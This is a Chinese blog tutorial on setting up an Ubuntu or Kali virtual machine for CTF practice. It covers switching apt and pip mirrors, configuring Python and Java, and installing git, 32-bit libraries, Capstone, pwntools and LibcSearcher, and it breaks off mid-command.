镜像站使用帮助 | 清华大学开源软件镜像站 | Tsinghua Open Source Mirror</a></p></blockquote><h2 id="Ubuntu-22-04"><a href="#Ubuntu-22-04" class="headerlink" title="Ubuntu 22.04"></a>Ubuntu 22.04</h2><blockquote><p>注意看好版本，这是 22.04 版的 Ubuntu，其他版本在 sources.list 下加入的内容可能会不一样</p></blockquote><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">cd</span> /etc/apt <span class="token comment"># 进入apt目录下</span><span class="token function">sudo</span> <span class="token function">cp</span> sources.list sources.list.backup <span class="token comment"># 备份</span><span class="token function">sudo</span> <span class="token function">vim</span> sources.list <span class="token comment"># 编辑sources.list文件</span><span class="token comment"># 加入下面两个----之间的内容</span>-----------------------------------------------------------------<span class="token comment"># 默认注释了源码镜像以提高 apt update 速度，如有需要可自行取消注释</span>deb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ jammy main restricted universe multiverse<span class="token comment"># deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ jammy main restricted universe multiverse</span>deb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ jammy-updates main restricted universe multiverse<span class="token comment"># deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ jammy-updates main restricted universe multiverse</span>deb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ jammy-backports main restricted universe multiverse<span class="token comment"># deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ jammy-backports main restricted universe multiverse</span>deb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ jammy-security main restricted universe multiverse<span class="token comment"># deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ jammy-security main restricted universe multiverse</span><span class="token comment"># 预发布软件源，不建议启用</span><span class="token comment"># deb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ jammy-proposed main restricted universe multiverse</span><span class="token comment"># deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ jammy-proposed main restricted universe multiverse</span>----------------------------------------------------------------- <span class="token comment"># 刷新三连</span><span class="token function">sudo</span> <span class="token function">apt</span> update<span class="token function">sudo</span> <span class="token function">apt</span> upgrade<span class="token function">sudo</span> <span class="token function">apt</span> clean<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>中科大源：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># 加入下面两个----之间的内容</span>-----------------------------------------------------------------deb https://mirrors.ustc.edu.cn/ubuntu/ jammy main restricted universe multiversedeb-src https://mirrors.ustc.edu.cn/ubuntu/ jammy main restricted universe multiversedeb https://mirrors.ustc.edu.cn/ubuntu/ jammy-updates main restricted universe multiversedeb-src https://mirrors.ustc.edu.cn/ubuntu/ jammy-updates main restricted universe multiversedeb https://mirrors.ustc.edu.cn/ubuntu/ jammy-backports main restricted universe multiversedeb-src https://mirrors.ustc.edu.cn/ubuntu/ jammy-backports main restricted universe multiversedeb https://mirrors.ustc.edu.cn/ubuntu/ jammy-security main restricted universe multiversedeb-src https://mirrors.ustc.edu.cn/ubuntu/ jammy-security main restricted universe multiversedeb https://mirrors.ustc.edu.cn/ubuntu/ jammy-proposed main restricted universe multiversedeb-src https://mirrors.ustc.edu.cn/ubuntu/ jammy-proposed main restricted universe multiverse-----------------------------------------------------------------<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>阿里源：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># 加入下面两个----之间的内容</span>-----------------------------------------------------------------deb http://mirrors.aliyun.com/ubuntu/ jammy main restricted universe multiversedeb-src http://mirrors.aliyun.com/ubuntu/ jammy main restricted universe multiversedeb http://mirrors.aliyun.com/ubuntu/ jammy-security main restricted universe multiversedeb-src http://mirrors.aliyun.com/ubuntu/ jammy-security main restricted universe multiversedeb http://mirrors.aliyun.com/ubuntu/ jammy-updates main restricted universe multiversedeb-src http://mirrors.aliyun.com/ubuntu/ jammy-updates main restricted universe multiversedeb http://mirrors.aliyun.com/ubuntu/ jammy-proposed main restricted universe multiversedeb-src http://mirrors.aliyun.com/ubuntu/ jammy-proposed main restricted universe multiversedeb http://mirrors.aliyun.com/ubuntu/ jammy-backports main restricted universe multiversedeb-src http://mirrors.aliyun.com/ubuntu/ jammy-backports main restricted universe multiverse-----------------------------------------------------------------<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>注意：</p><p>Ubuntu 24.04 将以前的配置文件 <code>/etc/apt/sources.list</code> 改成了 <code>/etc/apt/sources.list.d/ubuntu.sources</code>：</p></blockquote><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/Linux%E8%99%9A%E6%8B%9F%E6%9C%BACTF%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA31.png" alt="Linux虚拟机CTF环境搭建31.png"></p><p>只需要将原来的 URL 链接改成对应的镜像源链接即可，我这里是清华源：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/Linux%E8%99%9A%E6%8B%9F%E6%9C%BACTF%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA32.png" alt="Linux虚拟机CTF环境搭建32.png"></p><p>镜像源链接参考：<a href="https://mirrors.tuna.tsinghua.edu.cn/help/ubuntu/">ubuntu | 镜像站使用帮助 | 清华大学开源软件镜像站 | Tsinghua Open Source Mirror</a></p><p>其他可用镜像源链接参考：<a href="https://blog.csdn.net/xiangxianghehe/article/details/136529419">Ubuntu 24.04 抢先体验换国内源 清华源 阿里源 中科大源 163源_ubuntu24.04-CSDN博客</a></p><hr><h2 id="Kali-2022-4"><a href="#Kali-2022-4" class="headerlink" title="Kali 2022.4"></a>Kali 2022.4</h2><blockquote><p>注意看好版本，这是 2022.4 版的 Kali，其他版本在 sources.list 下加入的内容可能会不一样</p></blockquote><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">cd</span> /etc/apt <span class="token comment"># 进入apt目录下</span><span class="token function">sudo</span> <span class="token function">cp</span> sources.list sources.list.backup <span class="token comment"># 备份</span><span class="token function">sudo</span> <span class="token function">vim</span> sources.list <span class="token comment"># 编辑sources.list文件</span><span class="token comment"># 加入下面两个----之间的内容</span>-----------------------------------------------------------------deb http://mirrors.tuna.tsinghua.edu.cn/kali kali-rolling main contrib non-free deb-src https://mirrors.tuna.tsinghua.edu.cn/kali kali-rolling main contrib non-free-----------------------------------------------------------------<span class="token comment"># 刷新三联</span><span class="token function">sudo</span> <span class="token function">apt</span> update<span class="token function">sudo</span> <span class="token function">apt</span> upgrade<span class="token function">sudo</span> <span class="token function">apt</span> clean<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>如果出现报错：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">E: 无法下载 http://mirrors.tuna.tsinghua.edu.cn/kali/dists/kali-rolling/main/Contents-amd64.gz  文件尺寸不符<span class="token punctuation">(</span><span class="token number">45560927</span> <span class="token operator">!=</span> <span class="token number">45558390</span><span class="token punctuation">)</span>。您使用的镜像正在同步中？ <span class="token punctuation">[</span>IP: <span class="token number">101.6</span>.15.130 <span class="token number">80</span><span class="token punctuation">]</span>   Hashes of expected file:    - Filesize:45558390 <span class="token punctuation">[</span>weak<span class="token punctuation">]</span>    - SHA256:fd332c3ab98b5e98ac397a567a05bdd915101ce3ef1e86f05290b992301ba85a    - SHA1:7a6efb0f8eecb97ef9ef3a040ff4c200a00174e7 <span class="token punctuation">[</span>weak<span class="token punctuation">]</span>    - MD5Sum:8ee1329ae53741a9cf3d51ffb83c92c9 <span class="token punctuation">[</span>weak<span class="token punctuation">]</span>   Release <span class="token function">file</span> created at: Tue, <span class="token number">10</span> Oct <span class="token number">2023</span> 00:06:42 +0000E: 部分索引文件下载失败。如果忽略它们，那将转而使用旧的索引文件。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这是镜像源的问题</p><p>可以将清华源换为中科大源：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># 加入下面两个----之间的内容</span>-----------------------------------------------------------------deb http://mirrors.ustc.edu.cn/kali kali-rolling main non-free contribdeb-src http://mirrors.ustc.edu.cn/kali kali-rolling main non-free contrib-----------------------------------------------------------------<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>或者阿里源：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># 加入下面两个----之间的内容</span>-----------------------------------------------------------------deb http://mirrors.aliyun.com/kali kali-rolling main non-free contribdeb-src http://mirrors.aliyun.com/kali kali-rolling main non-free contrib-----------------------------------------------------------------<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><h1 id="Python-配置"><a href="#Python-配置" class="headerlink" title="Python 配置"></a>Python 配置</h1><h2 id="安装-python"><a href="#安装-python" class="headerlink" title="安装 python"></a>安装 python</h2><blockquote><p>系统有自带 python，但是可以自己换成更新的版本</p></blockquote><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">apt</span> <span class="token function">install</span> python3.10  <span class="token comment"># 以 python 3.10 为例，格式为 pythonx.x</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><hr><h2 id="设置默认-python-版本"><a href="#设置默认-python-版本" class="headerlink" title="设置默认 python 版本"></a>设置默认 python 版本</h2><blockquote><p>终端输入 python 默认识别为 python3，两种方式选其一即可</p></blockquote><ul><li>通过软链接修改</li></ul><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># 若显示 rm: 无法删除 '/usr/bin/python': 没有那个文件或目录，则直接执行下面那一句</span><span class="token function">sudo</span> <span class="token function">rm</span> /usr/bin/python<span class="token comment"># 例如我修改为python3.10</span><span class="token function">sudo</span> <span class="token function">ln</span> <span class="token parameter variable">-s</span> /usr/bin/python3.10 /usr/bin/python<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li>通过更改 <code>.bashrc</code> 修改</li></ul><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># 例如我修改为python3.10</span><span class="token builtin class-name">echo</span> <span class="token builtin class-name">alias</span> <span class="token assign-left variable">python</span><span class="token operator">=</span>python3.10 <span class="token operator">>></span> ~/.bashrc<span class="token builtin class-name">source</span> ~/.bashrc<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><hr><h2 id="安装-pip"><a href="#安装-pip" class="headerlink" title="安装 pip"></a>安装 pip</h2><blockquote><p>主要安装 python3 的 pip</p></blockquote><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">apt</span> <span class="token function">install</span> python3-pip<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>更新 pip 版本：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">pip3 <span class="token function">install</span> <span class="token parameter variable">--upgrade</span> pip<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><blockquote><p>注意：</p><p>Ubuntu 24.04、Kali 2024.1 中使用 pip 安装库或者更新 pip 的时候可能会报错：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">error: externally-managed-environment× This environment is externally managed╰─<span class="token operator">></span> To <span class="token function">install</span> Python packages system-wide, try <span class="token function">apt</span> <span class="token function">install</span>  python3-xyz, where xyz is the package you are trying to  install.<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></blockquote><p>其实这不是 bug，而是 Ubuntu 为了避免冲突而加入的</p><p>简单粗暴的方式，直接屏蔽掉即可：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">mv</span> /usr/lib/python3.12/EXTERNALLY-MANAGED /usr/lib/python3.12/EXTERNALLY-MANAGED.backup<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><blockquote><p>具体报错原因和其他解决方法的详细说明请参考文章：<a href="https://www.yaolong.net/article/pip-externally-managed-environment/">pip(3) install，完美解决 externally-managed-environment - 耀龙笔记</a></p></blockquote><hr><h2 id="设置默认-pip-版本"><a href="#设置默认-pip-版本" class="headerlink" title="设置默认 pip 版本"></a>设置默认 pip 版本</h2><blockquote><p>终端输入 pip 默认识别为 pip3</p></blockquote><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># 若显示 rm: 无法删除 '/usr/bin/pip': 没有那个文件或目录，则直接执行下面那一句</span><span class="token function">sudo</span> <span class="token function">rm</span> /usr/bin/pip<span class="token comment"># 例如我修改为pip3</span><span class="token function">sudo</span> <span class="token function">ln</span> <span class="token parameter variable">-s</span> /usr/bin/pip3 /usr/bin/pip<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><h2 id="更换-pip-源"><a href="#更换-pip-源" class="headerlink" title="更换 pip 源"></a>更换 pip 源</h2><blockquote><p>更换完下载源，该更换 pip 源了，在 Windows 下用 pip 安装过 python 库的都懂，这玩意不换没法用啊</p></blockquote><p>查看当前 pip 源配置：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">pip config list<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li>在命令行直接更改，打开终端：</li></ul><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">pip config <span class="token builtin class-name">set</span> global.index-url https://pypi.tuna.tsinghua.edu.cn/simple<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>如果配置成功，每次使用 <code>pip install xxx</code> 时，会显示：<code>&quot;Looking in indexes: https://pypi.tuna.tsinghua.edu.cn/simple&quot;</code>，且下载速度很快</p><ul><li>否则的话，说明配置未成功，尝试下面的方法手动配置：</li></ul><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">mkdir</span> ~/.config/pip <span class="token operator">&amp;&amp;</span> <span class="token builtin class-name">cd</span> ~/.config/pip                   <span class="token comment"># 新建 pip 文件夹，进入 pip 文件夹            </span><span class="token function">sudo</span> <span class="token function">vim</span> pip.conf                                 <span class="token comment"># 新建并编辑 pip.conf</span><span class="token comment"># 加入下面两个----之间的内容</span>-----------------------------------------------------------------<span class="token punctuation">[</span>global<span class="token punctuation">]</span>index-url <span class="token operator">=</span> https://pypi.tuna.tsinghua.edu.cn/simple<span class="token function">timeout</span> <span class="token operator">=</span> <span class="token number">6000</span><span class="token punctuation">[</span>install<span class="token punctuation">]</span>trusted-host <span class="token operator">=</span> pypi.tuna.tsinghua.edu.cndisable-pip-version-check <span class="token operator">=</span> <span class="token boolean">true</span>-----------------------------------------------------------------<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>中科大：<code>https://pypi.mirrors.ustc.edu.cn/simple</code><br>阿里：<code>http://mirrors.aliyun.com/pypi/simple</code></p><hr><h2 id="迁移-pip-库"><a href="#迁移-pip-库" class="headerlink" title="迁移 pip 库"></a>迁移 pip 库</h2><blockquote><p>如果想更换 Python 版本，可以直接将以前的 pip 库迁移到新的 python 环境下</p></blockquote><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># 生成 requirements.txt 文件  </span>pip freeze <span class="token operator">></span> requirements.txt<span class="token comment"># 在新环境下，安装 requirements.txt 依赖  </span>pip <span class="token function">install</span> <span class="token parameter variable">-r</span> requirements.txt<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>为防止 python 版本造成的 pip 库不兼容，使用以下脚本去掉 <code>requirements.txt</code> 中的版本号：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">remove_versions</span><span class="token punctuation">(</span>input_file<span class="token punctuation">,</span> output_file<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span>input_file<span class="token punctuation">,</span> <span class="token string">'r'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> <span class="token builtin">file</span><span class="token punctuation">:</span>        lines <span class="token operator">=</span> <span class="token builtin">file</span><span class="token punctuation">.</span>readlines<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span>output_file<span class="token punctuation">,</span> <span class="token string">'w'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> <span class="token builtin">file</span><span class="token punctuation">:</span>        <span class="token keyword">for</span> line <span class="token keyword">in</span> lines<span class="token punctuation">:</span>            <span class="token comment"># 去掉行末的换行符</span>            line <span class="token operator">=</span> line<span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span>            <span class="token comment"># 如果存在 '==', 则使用 '==' 进行分割，否则保留原样</span>            <span class="token keyword">if</span> <span class="token string">'=='</span> <span class="token keyword">in</span> line<span class="token punctuation">:</span>                package_name <span class="token operator">=</span> line<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">'=='</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>            <span class="token keyword">else</span><span class="token punctuation">:</span>                package_name <span class="token operator">=</span> line            <span class="token builtin">file</span><span class="token punctuation">.</span>write<span class="token punctuation">(</span>package_name <span class="token operator">+</span> <span class="token string">'\n'</span><span class="token punctuation">)</span><span class="token comment"># 使用示例</span>input_file <span class="token operator">=</span> <span class="token string">'./requirements.txt'</span>  <span class="token comment"># 输入文件名</span>output_file <span class="token operator">=</span> <span class="token string">'./requirements_no_version.txt'</span>  <span class="token comment"># 输出文件名</span>remove_versions<span class="token punctuation">(</span>input_file<span class="token punctuation">,</span> output_file<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>然后执行：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">pip <span class="token function">install</span> <span class="token parameter variable">-r</span> requirements_no_version.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>这样默认安装的就是支持当前 python 环境的最新版本 pip 库了</p><hr><h1 id="Java-配置"><a href="#Java-配置" class="headerlink" title="Java 配置"></a>Java 配置</h1><blockquote><p><code>open-jdk</code> 和 <code>oracle-jdk</code> 选其一即可，<code>oracle-jdk</code> 相对来说更稳定一点</p></blockquote><h2 id="安装-open-jdk"><a href="#安装-open-jdk" class="headerlink" title="安装 open-jdk"></a>安装 open-jdk</h2><p>查找 open-jdk 版本：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">apt</span> search openjdk<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>以安装 open-jdk 11 为例：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># 安装 java11</span><span class="token comment"># 若要安装 java8：sudo apt install openjdk-8-jdk</span><span class="token function">sudo</span> <span class="token function">apt</span> <span class="token function">install</span> openjdk-11-jdk<span class="token comment"># 验证</span><span class="token function">java</span> <span class="token parameter variable">-version</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>查看已安装的 open-jdk 版本：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">apt</span> list <span class="token parameter variable">--installed</span> <span class="token operator">|</span> <span class="token function">grep</span> openjdk<span class="token comment"># 显示：</span><span class="token comment"># openjdk-11-jdk-headless/jammy-updates,jammy-security,now 11.0.20.1+1-0ubuntu1~22.04 amd64 [已安装，自动]</span><span class="token comment"># openjdk-11-jdk/jammy-updates,jammy-security,now 11.0.20.1+1-0ubuntu1~22.04 amd64 [已安装]</span><span class="token comment"># openjdk-11-jre-headless/jammy-updates,jammy-security,now 11.0.20.1+1-0ubuntu1~22.04 amd64 [已安装，自动]</span><span class="token comment"># openjdk-11-jre/jammy-updates,jammy-security,now 11.0.20.1+1-0ubuntu1~22.04 amd64 [已安装，自动]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>卸载 open-jdk，以 open-jdk 11 为例：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">apt</span> <span class="token parameter variable">--purge</span> remove openjdk-11-jdk<span class="token function">sudo</span> <span class="token function">apt</span> <span class="token parameter variable">--purge</span> remove openjdk-11-jdk-headless<span class="token function">sudo</span> <span class="token function">apt</span> <span class="token parameter variable">--purge</span> remove openjdk-11-jre<span class="token function">sudo</span> <span class="token function">apt</span> <span class="token parameter variable">--purge</span> remove openjdk-11-jre-headless<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>可以同时使用 apt 安装多个版本的 open-jdk，然后使用如下命令切换 jdk 版本：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># 如果我们只用 apt 安装过一个版本的 java，会显示无需配置</span><span class="token function">sudo</span> update-alternatives <span class="token parameter variable">--config</span> <span class="token function">java</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><hr><h2 id="安装-oracle-jdk"><a href="#安装-oracle-jdk" class="headerlink" title="安装 oracle-jdk"></a>安装 oracle-jdk</h2><p>官网下载 jdk 压缩包：<a href="https://www.oracle.com/java/technologies/downloads/">Java Downloads | Oracle</a></p><p>以 oracle-jdk 8 为例，下载 <a href="https://www.oracle.com/webapps/redirect/signon?nexturl=https://download.oracle.com/otn/java/jdk/8u381-b09/8c876547113c4e4aab3c868e9e0ec572/jdk-8u381-linux-x64.tar.gz">jdk-8u381-linux-x64.tar.gz</a></p><p>解压并移动到 <code>/usr/bin</code> 目录下：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">tar</span> vxf jdk-8u381-linux-x64.tar.gz<span class="token function">sudo</span> <span class="token function">mv</span> jdk1.8.0_381 /usr/bin/<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>配置环境变量：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">export</span> <span class="token assign-left variable">JAVA_HOME</span><span class="token operator">=</span>/usr/bin/jdk1.8.0_381<span class="token builtin class-name">export</span> <span class="token assign-left variable"><span class="token environment constant">PATH</span></span><span class="token operator">=</span><span class="token variable">$JAVA_HOME</span>/bin:<span class="token environment constant">$PATH</span><span class="token builtin class-name">export</span> <span class="token assign-left variable">CLASSPATH</span><span class="token operator">=</span>.:<span class="token variable">$JAVA_HOME</span>/lib/dt.jar:<span class="token variable">$JAVA_HOME</span>/lib/tools.jar<span class="token comment"># 验证</span><span class="token function">java</span> <span class="token parameter variable">-version</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>卸载只需删除 <code>/usr/bin/java</code> 目录即可</p><hr><h1 id="CTF-配置"><a href="#CTF-配置" class="headerlink" title="CTF 配置"></a>CTF 配置</h1><blockquote><p>回归正题，可以开始安装 CTF 所需要的环境了</p></blockquote><h2 id="安装-git"><a href="#安装-git" class="headerlink" title="安装 git"></a>安装 git</h2><blockquote><p>迟早要用到的</p></blockquote><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">apt</span> <span class="token function">install</span> <span class="token function">git</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li>如果发现有时候网不行，github 项目 git 不下来或者 wget 不下来，无法连接，尝试 cdn 加速：</li></ul><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">git</span> config <span class="token parameter variable">--global</span> url.<span class="token string">"https://ghproxy.com/https://github.com"</span>.insteadOf <span class="token string">"https://github.com"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>如果不想使用了，通过：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">git</span> config <span class="token parameter variable">--global</span> <span class="token parameter variable">--edit</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>删除掉对应的配置即可</p><blockquote><p><strong>注意：官方是没有提供 cdn 的，因此上面的 cdn 链接都是用爱发电，可能某天就无法使用了</strong></p></blockquote><ul><li>查看当前 git 代理设置：</li></ul><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">git</span> config <span class="token parameter variable">-l</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li>也可以对 github.com 添加代理：</li></ul><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">git</span> config <span class="token parameter variable">--global</span> http.https://github.com.proxy http://192.168.148.1:7890<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>如果不想使用了，通过：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">git</span> config <span class="token parameter variable">--global</span> <span class="token parameter variable">--unset</span> http.https://github.com.proxy<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>取消代理即可</p><hr><h2 id="安装-32-位库"><a href="#安装-32-位库" class="headerlink" title="安装 32 位库"></a>安装 32 位库</h2><blockquote><p>运行 32 位的 ELF 可执行文件时需要</p></blockquote><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> dpkg --add-architecture i386<span class="token function">sudo</span> <span class="token function">apt</span> update<span class="token function">sudo</span> <span class="token function">apt</span> <span class="token function">install</span> libncurses5-dev lib32z1<span class="token function">sudo</span> <span class="token function">apt</span> <span class="token function">install</span> libc6:i386 libstdc++6:i386<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><hr><h2 id="安装-Capstone"><a href="#安装-Capstone" class="headerlink" title="安装 Capstone"></a>安装 Capstone</h2><blockquote><p>一个轻量级的多平台架构支持的反汇编架构</p></blockquote><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">git</span> clone https://github.com/aquynh/capstone /opt/capstone<span class="token builtin class-name">cd</span> /opt/capstone<span class="token function">sudo</span> <span class="token function">make</span><span class="token function">sudo</span> <span class="token function">make</span> <span class="token function">install</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><hr><h2 id="安装-pwntools"><a href="#安装-pwntools" class="headerlink" title="安装 pwntools"></a>安装 pwntools</h2><blockquote><p>通过 pip 安装或通过 git 安装，两种方法都可以，选其一即可</p></blockquote><ul><li>通过 python 的 pip 安装</li></ul><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">apt</span> <span class="token function">install</span> python3-pippip3 <span class="token function">install</span> <span class="token parameter variable">--upgrade</span> pip<span class="token function">sudo</span> python3 <span class="token parameter variable">-m</span> pip <span class="token function">install</span> pwntools<span class="token comment"># 或者直接安装pwn库，自带pwntools</span><span class="token function">sudo</span> python3 <span class="token parameter variable">-m</span> pip <span class="token function">install</span> pwn<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li>通过 git 安装</li></ul><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">git</span> clone https://github.com/Gallopsled/pwntools /opt/pwntools<span class="token builtin class-name">cd</span> /opt/pwntools<span class="token function">sudo</span> python setup.py <span class="token function">install</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><ul><li>验证安装</li></ul><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">python <span class="token comment"># 打开python</span><span class="token comment"># 输入下面的代码，Ⅰ或Ⅱ选其一即可</span>-------------------------------------------<span class="token comment"># Ⅰ</span><span class="token function">import</span> pwnpwn.asm<span class="token punctuation">(</span><span class="token string">"xor eax,eax"</span><span class="token punctuation">)</span>-------------------------------------------<span class="token comment"># Ⅱ</span>from pwn <span class="token function">import</span> *asm<span class="token punctuation">(</span><span class="token string">"xor eax,eax"</span><span class="token punctuation">)</span>-------------------------------------------<span class="token comment"># 如果输出的是这个，那就是安装成功了</span>输出：<span class="token string">'1\xc0'</span>-------------------------------------------<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><h2 id="安装-LibcSearcher"><a href="#安装-LibcSearcher" class="headerlink" title="安装 LibcSearcher"></a>安装 LibcSearcher</h2><blockquote><p>在做栈溢出相关的题时，经常会遇到构造 ROP 链的情况。若我们在 IDA 反编译之后没有看到 system 函数，栈题大概率需要泄漏 libc 库中的函数。此时，LibcSearcher 就是最好的选择，可以用它找到偏移地址</p></blockquote><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">pip3 <span class="token function">install</span> LibcSearcher <span class="token parameter variable">-i</span> 